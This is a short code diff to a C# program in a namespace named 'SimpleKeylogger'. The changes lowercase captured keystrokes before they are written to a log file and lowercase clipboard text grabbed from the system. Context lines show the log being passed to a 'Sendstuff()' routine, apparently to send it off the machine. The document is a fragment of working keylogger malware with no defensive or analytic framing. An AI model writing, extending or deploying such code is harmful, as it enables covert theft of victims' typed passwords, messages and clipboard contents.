@@ -129,7 +129,7 @@ namespace SimpleKeylogger
 
                     if (logFilePath != null)
                     {
-                        File.WriteAllText(logFilePath, _keyBuffer.ToString());
+                        File.WriteAllText(logFilePath, _keyBuffer.ToString().ToLower());
                         _keyBuffer.Clear();
                         fileToSend = logFilePath;
                         Sendstuff();
@@ -173,7 +173,7 @@ namespace SimpleKeylogger
                 // Get the clipboard content in a thread-safe manner
                 var thread = new Thread(() =>
                 {
-                    clipboardText = Clipboard.GetText();
+                    clipboardText = Clipboard.GetText().ToLower();
                 });
 
                 thread.SetApartmentState(ApartmentState.STA);
